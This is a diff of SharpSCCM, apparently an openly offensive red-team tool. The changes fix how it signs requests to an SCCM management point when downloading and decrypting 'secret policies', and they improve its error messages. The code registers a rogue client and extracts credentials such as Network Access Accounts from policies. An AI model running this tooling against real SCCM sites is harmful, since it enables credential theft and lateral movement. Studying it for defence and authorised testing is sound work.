@@ -7,7 +7,6 @@ using System.Security.Cryptography.Pkcs;
 using System.Security.Cryptography.X509Certificates;
 using System.Text;
 using System.Xml;
-using System.Runtime.InteropServices;
 
 // Configuration Manager SDK
 using Microsoft.ConfigurationManagement.Messaging.Framework;
@@ -18,14 +17,6 @@ namespace SharpSCCM
 {
     static class MgmtPointMessaging
     {
-        static MessageCertificateX509 CreateCertificate()
-        {
-            // Generate certificate for signing and encrypting messages
-            string[] oidPurposes = new string[] { "2.5.29.37" }; // Any extended key usage
-            MessageCertificateX509 certificate = MessageCertificateX509.CreateSelfSignedCertificate("ConfigMgr Client Signing and Encryption", "ConfigMgr Client Signing and Encryption", oidPurposes, DateTime.Now, DateTime.Now.AddMonths(6));
-            return certificate;
-        }
-
         public static MessageCertificateX509Volatile CreateUserCertificate(string subjectName = null, bool store = false)
         {
             // Generate certificate for signing and encrypting messages
@@ -68,9 +59,9 @@ namespace SharpSCCM
                 string decryptedPolicyBody = Encoding.ASCII.GetString(pkcs7EnvelopedCms.ContentInfo.Content).Replace("\0", string.Empty);
                 return decryptedPolicyBody;
             }
-            catch (Exception)
+            catch (Exception ex)
             {
-                Console.WriteLine("[!] Could not decrypt the secret policy");
+                Console.WriteLine($"[!] An exception occurred while trying to decrypt policy response: {ex.Message}");
                 return null;
             }
         }
@@ -81,11 +72,6 @@ namespace SharpSCCM
             x509Store.Open(OpenFlags.MaxAllowed);
             x509Store.Remove(certificate.X509Certificate);
             Console.WriteLine($"[+] Deleted the \"{certificate.X509Certificate.SubjectName.Name}\" certificate from {x509Store.Name} store for {x509Store.Location}");
-        }
-
-        public static void GetAvailablePackages(string managementPoint = null, string siteCode = null)
-        {
-
         }
 
         public static (MessageCertificateX509, MessageCertificateX509, SmsClientId) GetCertsAndClientId(string managementPoint = null, string siteCode = null, string encodedCertificate = null, string providedClientId = null, string username = null, string password = null, string registerClient = null, string encodedCertPassword = null)
@@ -160,7 +146,7 @@ namespace SharpSCCM
             return (signingCertificate, encryptionCertificate, clientId);
         }
 
-        public static async void GetSecretsFromPolicies(string managementPoint, string siteCode, string encodedCertificate = null, string providedClientId = null, string username = null, string password = null, string registerClient = null, string outputPath = null)
+        public static void GetSecretsFromPolicies(string managementPoint, string siteCode, string encodedCertificate = null, string providedClientId = null, string username = null, string password = null, string registerClient = null, string outputPath = null)
         {
             // Thanks to Adam Chester(@_xpn_) for figuring this out! https://blog.xpnsec.com/unobfuscating-network-access-accounts/
             // Register a new client using NTLM authentication for the specified machine account to automatically approve the new device record, allowing secret policy retrieval
@@ -174,11 +160,11 @@ namespace SharpSCCM
 
                 foreach (PolicyAssignment policyAssignment in assignmentReply.ReplyAssignments.PolicyAssignments)
                 {
-                    GetSecretsFromPolicy(policyAssignment, managementPoint, clientId, encryptionCertificate, outputPath);
+                    GetSecretsFromPolicy(policyAssignment, managementPoint, clientId, encryptionCertificate, signingCertificate, outputPath);
                 }
             }
         }
-        public static async void GetSecretsFromPolicy(PolicyAssignment policyAssignment, string managementPoint, SmsClientId clientId, MessageCertificateX509 encryptionCertificate, string outputPath = null)
+        public static async void GetSecretsFromPolicy(PolicyAssignment policyAssignment, string managementPoint, SmsClientId clientId, MessageCertificateX509 encryptionCertificate, MessageCertificateX509 signingCertificate, string outputPath = null)
         {
 
             // Get secret policies
@@ -198,13 +184,13 @@ namespace SharpSCCM
                 try
                 {
                     string policyURL = policyAssignment.Policy.Location.Value.Replace("<mp>", managementPoint);
-                    policyDownloadResponse = SendPolicyDownloadRequest(policyURL, clientId, encryptionCertificate);
+                    policyDownloadResponse = SendPolicyDownloadRequest(policyURL, clientId, signingCertificate);
                     byte[] policyDownloadResponseBytes = await policyDownloadResponse.Content.ReadAsByteArrayAsync();
                     Console.WriteLine($"[+] Received encoded response from server for policy {policyAssignment.Policy.Id}");
                 }
-                catch
+                catch (Exception ex)
                 {
-                    Console.WriteLine($"      Failed to download :/");
+                    Console.WriteLine($"[!] An exception occurred while trying to download policy: {ex.Message}");
                     return;
                 }
                 if (policyDownloadResponse != null)
@@ -214,9 +200,9 @@ namespace SharpSCCM
                     {
                         decryptedPolicyBody = DecryptPolicyBody(policyDownloadResponseBytes, encryptionCertificate);
                     }
-                    catch
+                    catch (Exception ex)
                     {
-                        Console.WriteLine($"[-] Error while trying to decrypt policy response :/...");
+                        Console.WriteLine($"[!] An exception occurred while trying to decrypt policy response: {ex.Message}");
                     }
                 }
                 if (decryptedPolicyBody != null)
@@ -718,7 +704,7 @@ namespace SharpSCCM
                     Console.WriteLine($"[+] Found {policyAssignmentNodeList.Count} Policy Assignments!");
 
                 }
-                catch (Exception ex)
+                catch (Exception)
                 {
                     string response = $"{assignmentResponse.Headers}\n\n{assignmentResponse.Content.ReadAsStringAsync().Result}";
                     Console.WriteLine("[-] Reply does not contain Policy Assignments. Received the following:");
@@ -774,7 +760,7 @@ namespace SharpSCCM
                                 policyAssignment.Policy.Location = policyLocation;
                             }
 
-                            GetSecretsFromPolicy(policyAssignment, szMPHostname, new SmsClientId(szMediaGUIDPlain), encryptioncertificate);
+                            GetSecretsFromPolicy(policyAssignment, szMPHostname, new SmsClientId(szMediaGUIDPlain), encryptioncertificate, signingCertificate);
                         }
                     }
                 }
